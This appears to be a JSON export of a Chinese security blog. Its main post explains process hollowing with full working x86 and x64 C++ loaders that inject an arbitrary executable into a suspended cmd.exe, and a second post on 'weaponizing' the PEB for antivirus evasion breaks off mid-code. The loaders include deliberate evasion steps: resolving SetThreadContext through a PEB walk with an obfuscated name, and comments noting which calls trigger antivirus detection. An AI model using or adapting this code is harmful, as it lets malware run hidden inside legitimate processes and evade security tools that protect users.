{"meta":{"title":"Dokey_","subtitle":"","description":"","author":"Dokey_","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2023-11-11T05:46:27.143Z","updated":"2023-03-25T15:52:59.513Z","comments":true,"path":"404.html","permalink":"http://example.com/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"JavaScript","date":"2023-11-11T05:46:27.155Z","updated":"2023-04-01T11:55:57.964Z","comments":false,"path":"JavaScript/index.html","permalink":"http://example.com/JavaScript/index.html","excerpt":"","text":""},{"title":"","date":"2021-02-08T10:24:34.000Z","updated":"2023-03-26T16:24:07.912Z","comments":false,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"Dokey_ Play With Reality. 有道无术, 术尚可求, 有术无道, 止于术. 神即道, 道法自然, 如来."},{"title":"分类","date":"2021-02-08T09:21:22.000Z","updated":"2023-03-25T15:41:05.443Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2021-02-08T10:24:34.000Z","updated":"2023-03-26T15:59:23.591Z","comments":false,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""},{"title":"","date":"2023-11-11T05:46:27.143Z","updated":"2023-03-26T15:57:42.370Z","comments":false,"path":"artitalk/index.html","permalink":"http://example.com/artitalk/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-02-08T09:23:45.000Z","updated":"2023-03-25T15:40:33.353Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"TodoList","date":"2023-11-11T05:46:27.163Z","updated":"2023-04-03T14:53:03.055Z","comments":false,"path":"todo/index.html","permalink":"http://example.com/todo/index.html","excerpt":"","text":"JavaScriptJavaScript TodoList 学习JavaScript中this指向 学习JavaScript中闭包 学习JavaScript中原型链 学习JavaScript中词法作用域、作用链 Node.jsNode.js TodoList 学习Node.js中异步编程 学习koa web框架的使用 Windows API"},{"title":"Windows API","date":"2023-11-11T05:46:27.163Z","updated":"2023-04-01T11:39:18.745Z","comments":false,"path":"windowsAPI/index.html","permalink":"http://example.com/windowsAPI/index.html","excerpt":"","text":""},{"title":"暂时不知道写什么","date":"2023-11-11T05:46:27.163Z","updated":"2023-04-01T11:49:36.208Z","comments":false,"path":"tools/index.html","permalink":"http://example.com/tools/index.html","excerpt":"","text":""},{"title":"Windows Hook","date":"2023-11-11T05:46:27.163Z","updated":"2023-05-17T13:47:48.818Z","comments":false,"path":"windowsHook/index.html","permalink":"http://example.com/windowsHook/index.html","excerpt":"","text":""},{"title":"Windows 注入技术","date":"2023-11-11T05:46:27.163Z","updated":"2023-05-28T02:22:54.510Z","comments":false,"path":"windows注入/index.html","permalink":"http://example.com/windows%E6%B3%A8%E5%85%A5/index.html","excerpt":"","text":""},{"title":"Windows 基础","date":"2023-11-11T05:46:27.163Z","updated":"2023-05-07T03:07:06.937Z","comments":false,"path":"windows基础/index.html","permalink":"http://example.com/windows%E5%9F%BA%E7%A1%80/index.html","excerpt":"","text":""},{"title":"相册","date":"2023-11-11T05:46:27.143Z","updated":"2023-03-26T14:32:58.486Z","comments":false,"path":"custom/gallery/index.html","permalink":"http://example.com/custom/gallery/index.html","excerpt":"","text":"头像网站壁纸赛博朋克Jean Jullien"}],"posts":[{"title":"ShellCode加载器","slug":"ShellCode加载器","date":"2024-06-27T14:56:45.000Z","updated":"2024-06-27T14:57:58.557Z","comments":true,"path":"3cf1e5d0.html","link":"","permalink":"http://example.com/3cf1e5d0.html","excerpt":"ShellCode加载器","text":"ShellCode加载器","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}]},{"title":"进程镂空(傀儡进程)","slug":"进程镂空-傀儡进程","date":"2024-06-27T12:23:25.000Z","updated":"2024-06-27T15:30:17.529Z","comments":true,"path":"efa87f6d.html","link":"","permalink":"http://example.com/efa87f6d.html","excerpt":"进程镂空(傀儡进程)进程镂空(Process Hollowing), 又称傀儡进程, 是一种恶意软件(malware)利用的代码注入技术。它主要用于恶意代码注入到合法进程中, 以规避安全检测、提高恶意代码执行的隐蔽性和稳定性;","text":"进程镂空(傀儡进程)进程镂空(Process Hollowing), 又称傀儡进程, 是一种恶意软件(malware)利用的代码注入技术。它主要用于恶意代码注入到合法进程中, 以规避安全检测、提高恶意代码执行的隐蔽性和稳定性; x32位实现思路创建挂起进程 以挂起的形式创建一个新的目标进程(以cmd.exe为例), 使用CreatePorcessA函数时需设置dwCreationFlags为CREATE_SUSPENDED; 1234567891011121314151617181920STARTUPINFOA lpStartupInfo = &#123;&#125;;lpStartupInfo.cb = sizeof(STARTUPINFOA);PROCESS_INFORMATION pi = &#123;&#125;;// 以挂起的形式启动一个进程if (FALSE == CreateProcessA( NULL, (LPSTR)&quot;cmd&quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;lpStartupInfo, &amp;pi))&#123; printf(&quot;CreateFile Failed\\n&quot;); return -1;&#125; 将恶意程序加载到内存123456789101112131415HANDLE hFile = CreateFile(szTARGETFILE, GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL);if (hFile == NULL)&#123; printf(&quot;CreateFile Failed.\\n&quot;); return -1;&#125;DWORD dwFileSize = GetFileSize(hFile, NULL);LPVOID lpBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);DWORD dwReadLenth = 0;if (FALSE == ReadFile(hFile, lpBuffer, dwFileSize, &amp;dwReadLenth, NULL))&#123; printf(&quot;ReadFile Failed,\\n&quot;); return -1;&#125;CloseHandle(hFile); 获取挂起进程上下文以及映像基址 通过ctx.Ebx+8可以获取傀儡进程的ImageBase地址，因为ctx.Ebx包含PEB地址，而PEB的ImageBaseAddress字段位于PEB的偏移量0x8处 1234567// 获取上下文CONTEXT ctx = &#123;&#125;;ctx.ContextFlags = CONTEXT_ALL;GetThreadContext(pi.hThread, &amp;ctx);LPVOID lpImageBase = NULL;ReadProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + 8), &amp;lpImageBase, sizeof(PVOID), NULL); // ctx.Ebx = PEB, ctx.Ebx + 8 = PEB.ImageBase 卸载挂起进程内存12345678910if ((DWORD)lpImageBase == pNt-&gt;OptionalHeader.ImageBase)&#123; FnNtUnmapViewOfSection NtUnmapViewOfSection = (FnNtUnmapViewOfSection)GetProcAddress(LoadLibrary(L&quot;ntdll.dll&quot;), &quot;NtUnmapViewOfSection&quot;); if (NtUnmapViewOfSection == NULL) &#123; printf(&quot;NtUnmapViewOfSection GetProcAddress Failed.\\n&quot;); return -1; &#125; NtUnmapViewOfSection(pi.hProcess, lpImageBase);&#125; 将恶意程序内容写入目标进程 申请可读可写可执行内存, 将恶意程序头部写入内存, 然后循环将区段写入; 12345678910111213141516LPVOID lpTargetMemory = VirtualAllocEx(pi.hProcess, (PVOID)pNt-&gt;OptionalHeader.ImageBase, pNt-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);if (lpTargetMemory == NULL)&#123; printf(&quot;VirtualAllocEx Failed\\n&quot;); return -1;&#125;if (FALSE == WriteProcessMemory(pi.hProcess, lpTargetMemory, lpBuffer, pNt-&gt;OptionalHeader.SizeOfHeaders, NULL))&#123; printf(&quot;WritePrcessMemory PE Header Failed.\\n&quot;); return -1;&#125;for (size_t i = 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)&#123; PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)lpBuffer + pDos-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * i)); WriteProcessMemory(pi.hProcess, ((LPBYTE)lpTargetMemory + pSec-&gt;VirtualAddress), ((LPBYTE)lpBuffer + pSec-&gt;PointerToRawData), pSec-&gt;SizeOfRawData, NULL);&#125; 更新目标进程的线程上下文 将EntryPoint地址写入ctx.Eax是为了让目标进程在恢复执行时，从特定的地址（EntryPoint）开始运行; ctx.Ebx + sizeof(DWORD) * 2相当于ctx.Ebx + 0x8; 同样是将新的ImageBase写入到PEB偏移0x8处, 也就是ImageBaseAddress字段; 12ctx.Eax = (DWORD)((LPBYTE)lpTargetMemory + pNt-&gt;OptionalHeader.AddressOfEntryPoint);WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + sizeof(DWORD) * 2), &amp;pNt-&gt;OptionalHeader.ImageBase, sizeof(LPVOID), NULL); 恢复目标进程主线程 使用动态获取SetThreadContext函数并调用, 规避一下杀软; 恢复主线程并关闭句柄; 123456789101112//SetThreadContext(pi.hThread, &amp;ctx);MySetThreadContext mySetThreadContext = (MySetThreadContext)DynamicCall();if (mySetThreadContext == NULL)&#123; printf(&quot;DynamicCall Failed\\n&quot;); return 0;&#125;mySetThreadContext(pi.hThread, &amp;ctx);ResumeThread(pi.hThread);CloseHandle(pi.hProcess);CloseHandle(pi.hThread); x32位完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169// 傀儡进程/进程镂空// 1. 以挂起的模式启动一个进程（计算器，cmd，notepad）合法程序// 2. 把真正要执行的代码读入// 3. 获取挂起进程相关信息// 4. 把挂起进程的内存掏空// 5. 把要执行的代码写入掏空的进程// 6. 恢复执行#include &lt;iostream&gt;#include &lt;windows.h&gt;const wchar_t* szTARGETFILE = L&quot;D:\\\\test.exe&quot;;typedef NTSTATUS(WINAPI* FnNtUnmapViewOfSection)(HANDLE, PVOID);typedef BOOL (WINAPI* MySetThreadContext)(_In_ HANDLE hThread,_In_ CONST CONTEXT* lpContext);// 动态获取SetThreadContext的地址DWORD DynamicCall() &#123; // 1. 获取Kernel32的基址 DWORD dwKernel32 = 0; // TEB结构体 _TEB* pTeb = NtCurrentTeb(); // PEB结构体 PDWORD pPeb = (PDWORD) * (PDWORD)((DWORD)pTeb + 0x30); // LDR结构体 PDWORD pLdr = (PDWORD) * (PDWORD)((DWORD)pPeb + 0x0c); // 进程所有模块 PDWORD pInLoadOrderLinks = (PDWORD) * (PDWORD)((DWORD)pLdr + 0x0c); // 主模块 PDWORD pModExe = (PDWORD)*pInLoadOrderLinks; // NtDll PDWORD pModNtDll = (PDWORD)*pModExe; // Kernel32Dll PDWORD pModKernel32 = (PDWORD)*pModNtDll; // 基址 dwKernel32 = pModKernel32[6]; printf(&quot;Kernel32 Base: %08x %S\\n&quot;, dwKernel32, (const char*)pModKernel32[12]); // 解析PE文件 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)dwKernel32; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT); PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pDir-&gt;VirtualAddress + (DWORD)pDos); PDWORD pwAddressOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + (DWORD)pDos); PDWORD pwAddressOfNames = (PDWORD)(pExport-&gt;AddressOfNames + (DWORD)pDos); PWORD pAddressOfNameOrdinals = (PWORD)(pExport-&gt;AddressOfNameOrdinals + (DWORD)pDos); DWORD dwNumberOfNames = pExport-&gt;NumberOfNames; //DWORD dwGetProcAddress = 0; DWORD dwSetThreadContext = 0; for (size_t i = 0; i &lt; dwNumberOfNames; i++) &#123; const char* szFuncName = (char*)(pwAddressOfNames[i] + (DWORD)pDos); char szSetThreadAddress[] = &#123; &#x27;S&#x27;, &#x27;e&#x27;, &#x27;t&#x27;, &#x27;T&#x27;, &#x27;h&#x27;, &#x27;r&#x27;, &#x27;e&#x27;, &#x27;a&#x27;, &#x27;d&#x27;, &#x27;C&#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27;t&#x27;, &#x27;e&#x27;, &#x27;x&#x27;, &#x27;t&#x27;,&#x27;\\0&#x27;&#125;; int nFlags = 0; for (size_t j = 0; j &lt; 16; j++) &#123; if (szFuncName[j] == szSetThreadAddress[j]) &#123; nFlags++; &#125; if (nFlags == 16) &#123; dwSetThreadContext = (DWORD)(pwAddressOfFunctions[pAddressOfNameOrdinals[i]] + (DWORD)pDos); break; &#125; &#125; &#125; // 不能打印SetThreadContext地址, 会触发HR报毒 //printf(&quot;dwSetThreadContext: %08x\\n&quot;, dwSetThreadContext); if (dwSetThreadContext == NULL) &#123; return 0; &#125; return dwSetThreadContext;&#125;int main()&#123; STARTUPINFOA lpStartupInfo = &#123;&#125;; lpStartupInfo.cb = sizeof(STARTUPINFOA); PROCESS_INFORMATION pi = &#123;&#125;; // 以挂起的形式启动一个进程 if (FALSE == CreateProcessA(NULL, (LPSTR)&quot;cmd&quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;lpStartupInfo, &amp;pi)) &#123; printf(&quot;CreateFile Failed\\n&quot;); return -1; &#125; HANDLE hFile = CreateFile(szTARGETFILE, GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL); if (hFile == NULL) &#123; printf(&quot;CreateFile Failed.\\n&quot;); return -1; &#125; DWORD dwFileSize = GetFileSize(hFile, NULL); LPVOID lpBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); DWORD dwReadLenth = 0; if (FALSE == ReadFile(hFile, lpBuffer, dwFileSize, &amp;dwReadLenth, NULL)) &#123; printf(&quot;ReadFile Failed,\\n&quot;); return -1; &#125; CloseHandle(hFile); // 解析PE PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpBuffer); // 获取上下文 CONTEXT ctx = &#123;&#125;; ctx.ContextFlags = CONTEXT_ALL; GetThreadContext(pi.hThread, &amp;ctx); LPVOID lpImageBase = NULL; ReadProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + 8), &amp;lpImageBase, sizeof(PVOID), NULL); if ((DWORD)lpImageBase == pNt-&gt;OptionalHeader.ImageBase) &#123; FnNtUnmapViewOfSection NtUnmapViewOfSection = (FnNtUnmapViewOfSection)GetProcAddress(LoadLibrary(L&quot;ntdll.dll&quot;), &quot;NtUnmapViewOfSection&quot;); if (NtUnmapViewOfSection == NULL) &#123; printf(&quot;NtUnmapViewOfSection GetProcAddress Failed.\\n&quot;); return -1; &#125; NtUnmapViewOfSection(pi.hProcess, lpImageBase); &#125; LPVOID lpTargetMemory = VirtualAllocEx(pi.hProcess, (PVOID)pNt-&gt;OptionalHeader.ImageBase, pNt-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (lpTargetMemory == NULL) &#123; printf(&quot;VirtualAllocEx Failed\\n&quot;); return -1; &#125; if (FALSE == WriteProcessMemory(pi.hProcess, lpTargetMemory, lpBuffer, pNt-&gt;OptionalHeader.SizeOfHeaders, NULL)) &#123; printf(&quot;WritePrcessMemory PE Header Failed.\\n&quot;); return -1; &#125; for (size_t i = 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++) &#123; PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)lpBuffer + pDos-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * i)); WriteProcessMemory(pi.hProcess, ((LPBYTE)lpTargetMemory + pSec-&gt;VirtualAddress), ((LPBYTE)lpBuffer + pSec-&gt;PointerToRawData), pSec-&gt;SizeOfRawData, NULL); &#125; ctx.Eax = (DWORD)((LPBYTE)lpTargetMemory + pNt-&gt;OptionalHeader.AddressOfEntryPoint); WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Ebx + sizeof(DWORD) * 2), &amp;pNt-&gt;OptionalHeader.ImageBase, sizeof(LPVOID), NULL); //SetThreadContext(pi.hThread, &amp;ctx); MySetThreadContext mySetThreadContext = (MySetThreadContext)DynamicCall(); if (mySetThreadContext == NULL) &#123; printf(&quot;DynamicCall Failed\\n&quot;); return 0; &#125; mySetThreadContext(pi.hThread, &amp;ctx); ResumeThread(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); system(&quot;pause&quot;); return 0;&#125; x64位实现思路 实现逻辑和x32位基本类似, 区别在于动态获取函数地址时需要从gs:[0]偏移0x60获取PEB在64位系统中, TEB存储在Rdx寄存器中, 在PEB结构中ImageBaseAddress字段位于偏移量0x10, 因此ctx.Rdx + (sizeof(SIZE_T) * 2)等同于(ctx.Rdx + 0x10) x64位完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183// 傀儡进程/进程镂空（x64）// 1. 以挂起的模式启动一个进程（计算器、cmd、notepad）合法程序// 2. 把真正要执行的代码读入// 3. 获取挂起进程相关信息// 4. 把挂起进程的内存掏空// 5. 把要执行的代码写入掏空的进程// 6. 恢复执行#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;winternl.h&gt;#include &lt;intrin.h&gt;// 要加载的程序const wchar_t* TARGETFILE = L&quot;D:\\\\test.exe&quot;;// 定义函数类型typedef NTSTATUS(WINAPI* FnNtUnmapViewOfSection)(HANDLE, PVOID);typedef BOOL(WINAPI* MySetThreadContext)(_In_ HANDLE hThread, _In_ CONST CONTEXT* lpContext);DWORD64 DynamicCall()&#123; // 通过PEB获取kernel32基址 PVOID pPeb = reinterpret_cast&lt;PVOID&gt;(__readgsqword(0x60)); if (!pPeb) &#123; std::cerr &lt;&lt; &quot;Failed to get PEB address.&quot; &lt;&lt; std::endl; return 1; &#125; // 计算 Ldr 地址的偏移量 ULONG64 ldrOffset = 0x18; // PEB 结构中 Ldr 成员的偏移量 // 获取_PEB_LDR_DATA //PVOID pLdr = *reinterpret_cast&lt;PVOID*&gt;(reinterpret_cast&lt;PBYTE&gt;(pPeb) + (ULONG64)0x18); PVOID pLdr = *reinterpret_cast&lt;PVOID*&gt;(reinterpret_cast&lt;PBYTE&gt;(pPeb) + ldrOffset); if (!pLdr) &#123; std::cerr &lt;&lt; &quot;Failed to get Ldr address.&quot; &lt;&lt; std::endl; return 1; &#125; // 计算InMemoryOrderModuleList地址的偏移量 ULONG64 moduleListOffset = offsetof(PEB_LDR_DATA, InMemoryOrderModuleList); // 计算InMemoryOrderModuleList地址 PLIST_ENTRY pModuleList = reinterpret_cast&lt;PLIST_ENTRY&gt;(reinterpret_cast&lt;PBYTE&gt;(pLdr) + moduleListOffset); // 获取KERNEL32.dll基址 PLIST_ENTRY pKernel32Entry = pModuleList-&gt;Flink-&gt;Flink-&gt;Flink; PLDR_DATA_TABLE_ENTRY pKernelEntry = CONTAINING_RECORD(pKernel32Entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); PVOID pKernelBase = pKernelEntry-&gt;DllBase; // 解析PE PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pKernelBase; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)pDos); PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT); PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pDir-&gt;VirtualAddress + (DWORD64)pDos); PDWORD pwAddressOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + (DWORD64)pDos); PDWORD pwAddressOfNames = (PDWORD)(pExport-&gt;AddressOfNames + (DWORD64)pDos); PWORD dwAddressOfNameOrdinals = (PWORD)(pExport-&gt;AddressOfNameOrdinals + (DWORD64)pDos); DWORD dwNumberOfNames = pExport-&gt;NumberOfNames; DWORD64 dwSetThreadContext = 0; for (size_t i = 0; i &lt; dwNumberOfNames; i++) &#123; const char* szFuncName = (char*)(pwAddressOfNames[i] + (DWORD64)pDos); char szSetThreadAddress[] = &#123; &#x27;S&#x27;, &#x27;e&#x27;, &#x27;t&#x27;, &#x27;T&#x27;, &#x27;h&#x27;, &#x27;r&#x27;, &#x27;e&#x27;, &#x27;a&#x27;, &#x27;d&#x27;, &#x27;C&#x27;, &#x27;o&#x27;, &#x27;n&#x27;, &#x27;t&#x27;, &#x27;e&#x27;, &#x27;x&#x27;, &#x27;t&#x27;,&#x27;\\0&#x27; &#125;; int iFlags = 0; for (size_t j = 0; j &lt; 16; j++) &#123; if (szFuncName[j] == szSetThreadAddress[j]) &#123; iFlags++; &#125; if (iFlags == 16) &#123; dwSetThreadContext = (DWORD64)(pwAddressOfFunctions[dwAddressOfNameOrdinals[i]] + (DWORD64)pDos); break; &#125; &#125; &#125; if (dwSetThreadContext == NULL) &#123; return 0; &#125; return dwSetThreadContext;&#125;int main()&#123; STARTUPINFOA si = &#123;0&#125;; si.cb = sizeof(STARTUPINFOA); PROCESS_INFORMATION pi = &#123;0&#125;; if (FALSE == CreateProcessA(NULL, (LPSTR)&quot;cmd&quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi)) &#123; printf(&quot;CreateProcessA Failed\\n&quot;); return -1; &#125; // 读取要执行的进程 HANDLE hFile = CreateFile(TARGETFILE, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); if (NULL == hFile) &#123; printf(&quot;CreateFile Failed\\n&quot;); return -1; &#125; DWORD dwFileSize = GetFileSize(hFile, NULL); LPVOID lpBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (NULL == lpBuffer) &#123; printf(&quot;VirtualAlloc Failed\\n&quot;); return -1; &#125; DWORD lpNumberOfBytesRead = 0; if (FALSE == ReadFile(hFile, lpBuffer, dwFileSize, &amp;lpNumberOfBytesRead, NULL)) &#123; printf(&quot;ReadFile Failed\\n&quot;); return -1; &#125; CloseHandle(hFile); printf(&quot;%x\\n&quot;, *(short*)lpBuffer); // 解析PE PIMAGE_DOS_HEADER pDos = PIMAGE_DOS_HEADER(lpBuffer); PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)lpBuffer); // 获取挂起进程上下文 CONTEXT ctx = &#123;&#125;; ctx.ContextFlags = CONTEXT_FULL; GetThreadContext(pi.hThread, &amp;ctx); // 获取挂起进程的映像基址 LPVOID lpOldImageBase = 0; // (ctx.Rdx + (sizeof(SIZE_T) * 2) =&gt; ctx.Rdx + 0x10 =&gt; PEB + 0x10 = ImageBaseAddress if (FALSE == ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &amp;lpOldImageBase, sizeof(PVOID), NULL)) &#123; printf(&quot;ReadProcessMemory To lpOldImageBase Failed\\n&quot;); return -1; &#125; // 判断文件预期加载地址是否被占用 FnNtUnmapViewOfSection fnNtUnmapViewOfSection = (FnNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtUnmapViewOfSection&quot;); if ((SIZE_T)lpOldImageBase == pNt-&gt;OptionalHeader.ImageBase) &#123; fnNtUnmapViewOfSection(pi.hProcess, lpOldImageBase); // 卸载已存在的文件 &#125; // 为可执行映像分配内存, 写入PE文件头 LPVOID lpTargetMemory = VirtualAllocEx(pi.hProcess, (PVOID)pNt-&gt;OptionalHeader.ImageBase, pNt-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (NULL == lpTargetMemory) &#123; printf(&quot;VirtualAllocEx Failed\\n&quot;); return -1; &#125; if (FALSE == WriteProcessMemory(pi.hProcess, lpTargetMemory, lpBuffer, pNt-&gt;OptionalHeader.SizeOfHeaders, NULL)) &#123; printf(&quot;WriteProcessMemory Failed\\n&quot;); return -1; &#125; for (size_t i = 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++) &#123; PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)lpBuffer + pDos-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)lpTargetMemory + pSec-&gt;VirtualAddress), (PVOID)((LPBYTE)lpBuffer + pSec-&gt;PointerToRawData), pSec-&gt;SizeOfRawData, NULL); &#125; // 将Rcx寄存器设置为入口点 ctx.Rcx = (SIZE_T)((LPBYTE)lpTargetMemory + pNt-&gt;OptionalHeader.AddressOfEntryPoint); WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &amp;pNt-&gt;OptionalHeader.ImageBase, sizeof(PVOID), NULL); //SetThreadContext(pi.hThread, &amp;ctx); MySetThreadContext mySetThreadContext = (MySetThreadContext)DynamicCall(); if (mySetThreadContext == NULL) &#123; printf(&quot;DynamicCall Failed\\n&quot;); return -1; &#125; mySetThreadContext(pi.hThread, &amp;ctx); ResumeThread(pi.hThread); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); system(&quot;pause&quot;); return 0;&#125;","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}]},{"title":"ShellCode原理及编写","slug":"ShellCode原理及编写","date":"2024-06-27T11:45:51.000Z","updated":"2024-06-27T12:09:31.158Z","comments":true,"path":"29c16d52.html","link":"","permalink":"http://example.com/29c16d52.html","excerpt":"Shellcode原理及编写","text":"Shellcode原理及编写","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}]},{"title":"PEB武器化","slug":"PEB武器化","date":"2024-06-27T08:25:29.000Z","updated":"2024-06-27T11:43:22.744Z","comments":true,"path":"15d21ffc.html","link":"","permalink":"http://example.com/15d21ffc.html","excerpt":"基于对Windows TEB/PEB的分析, 可以做一些免杀中的应用","text":"基于对Windows TEB/PEB的分析, 可以做一些免杀中的应用 动态获取API 通过对Windows TEB/PEB的分析, 可以获取到KERNEL32.dll的基址, 然后解析PE, 遍历导出表获取GetProcAddress函数地址, 再使用GetProcAddress函数获取其他函数地址 x32位动态获取API 32位下通过fs:[0]寄存器获取TEB, 然后偏移0x30得到PEB; 解析TEB&#x2F;PEB获取KERNEL32.dll基址12345678910111213141516171819// TEB结构体_TEB* pTeb = NtCurrentTeb(); // 指向当前线程的线程环境块的指针// PEB结构体PDWORD pPeb = (PDWORD) * (PDWORD)((DWORD)pTeb + 0x30); // 偏移0x30得到PEB// LDR结构体PDWORD pLdr = (PDWORD) * (PDWORD)((DWORD)pPeb + 0x0c); // PEB偏移0x0c得到_PEB_LDR_DATA// 进程所有模块PDWORD pInLoadOrderLinks = (PDWORD) * (PDWORD)((DWORD)pLdr + 0x0c); // _PEB_LDR_DATA偏移0x0c得到InLoadOrderModuleList// 主模块PDWORD pModExe = (PDWORD)*pInLoadOrderLinks; // 第一个为主模块（程序本身）// NtDllPDWORD pModNtDll = (PDWORD)*pModExe; // 第二个为ntdll.dll// Kernel32DllPDWORD pModKernel32 = (PDWORD)*pModNtDll; // 第三个为KERNEL32.dll// 基址dwKernel32 = pModKernel32[6]; // 偏移0x18 =&gt; 24 / 4 = 6 其中第6个为基址printf(&quot;Kernel32 Base: %08x %S\\n&quot;, dwKernel32, (const char*)pModKernel32[12]); 解析PE, 获取GetProcAddress 获取到KERNEL32.dll基址, 通过解析PE遍历KERNEL32.dll的导出表获取到GetProcAddress函数地址; 1234567891011121314151617181920212223242526272829303132333435363738// 解析pe文件PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dwKernel32;// 解析NtHeaderPIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + dwKernel32);// 定位导出表PIMAGE_DATA_DIRECTORY pExportDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT);// 解析导出表PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pExportDir-&gt;VirtualAddress + dwKernel32);// 获取函数地址表PDWORD dwAddrOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + dwKernel32);// 获取函数序号表PWORD dwAddrOfNameOrds = (PWORD)(pExport-&gt;AddressOfNameOrdinals + dwKernel32);// 获取函数名称表PDWORD dwAddrOfNames = (PDWORD)(pExport-&gt;AddressOfNames + dwKernel32);// 获取函数名称总数DWORD dwNumOfNames = (DWORD)pExport-&gt;NumberOfNames;DWORD dwGetProcAddress = 0;// 通过遍历函数名称总数for (size_t i = 0; i &lt; dwNumOfNames; i++)&#123; // 获取函数名 const char* szFuncName = (char*)(dwAddrOfNames[i] + dwKernel32); // 局部变量 char szGetProcAddress[] = &#123; 